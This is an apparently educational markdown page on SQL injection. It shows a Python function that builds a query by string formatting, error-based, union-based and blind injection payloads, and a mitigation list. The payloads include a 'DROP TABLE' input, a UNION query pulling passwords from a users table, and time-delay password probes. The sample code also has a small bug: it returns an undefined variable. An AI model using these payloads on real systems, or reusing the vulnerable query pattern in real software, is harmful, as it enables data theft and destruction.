# 💉 SQL Injection

SQL Injection SQLi is a vulnerability that occurs when a user manages to modify the behavior of an SQL query. From this modification it may be possible to read, modify and delete data from the database. It may also be possible to compromise the **confidentiality**, **integrity** and/or **availability** of the application.

```python
def get_customer(id):
    customers = cursor.execute("SELECT * FROM customers WHERE id = '%s'" % id)
    return users
```

| ⚠️ Input (id) | 💣 Query executed |
| --- | --- |
| 100 | SELECT * FROM customers WHERE id = 100 |
| 141 | SELECT * FROM customers WHERE id = 141 |
| 100 OR 1 = 1 | SELECT * FROM customers WHERE id = 100 OR 1 = 1 |
| 100; DROP TABLE suppliers | SELECT * FROM customers WHERE id = 100; DROP TABLE suppliers |


## ❌ Error Based
Obtain information from the database by analyzing the error messages returned.

```sql
SELECT id, first_name FROM customers WHERE id = '100' OR first_name = 'John'
```
```http
Error when executing query "SELECT id, first_name FROM customers WHERE id = '100' OR first_name = 'John'": column name "first_name" doesn't exist
```

## 🤝🏻 Union Based
Get information from the database using the UNION operation to bring in fields from the same or other tables.

```sql
SELECT id, name FROM customers WHERE id = '100' UNION SELECT id, password FROM users
```

## 👨🏻‍🦯 Blind SQL
If the result of the SQL query is not returned in the request, we can still exploit SQL Injection using Boolean expressions or delays.

| ⚠️ Input (id) | 💣 Query executed | ⚡ Result
| --- | --- | --- |
| 100 AND LENGTH(password) = '8' | `SELECT id, name FROM users WHERE id = 100 AND LENGTH(password) = '8'` | ERROR
| 100 AND LENGTH(password) = '9' | `SELECT id, name FROM users WHERE id = 100 AND LENGTH(password) = '9'` | ERROR
| 100 AND LENGTH(password) = '10' | `SELECT id, name FROM users WHERE id = 100 AND LENGTH(password) = '10'` | SUCCESS
| 100; SELECT CASE WHEN (LENGTH(password) = '9') THEN sleep(10) END FROM users | `SELECT id, name FROM users WHERE id = 100; SELECT CASE WHEN (LENGTH(password) = '9') THEN sleep(10) END FROM users` | ERROR
| 100; SELECT CASE WHEN (LENGTH(password) = '10') THEN sleep(10) END FROM users | `SELECT id, name FROM users WHERE id = 100; SELECT CASE WHEN (LENGTH(password) = '10') THEN sleep(10) END FROM users` | DELAY

## 🛡️ Mitigation
- Implement Input Validation and Sanitization.

- Use Escaping for User Input.

- Utilize Parameterized Statements (Prepared Statements).

- Incorporate Stored Procedures.

- Conduct Continuous Scanning and Penetration Testing.

- Adopt the Least Privilege Principle.

- Deploy Web Application Firewalls (WAF).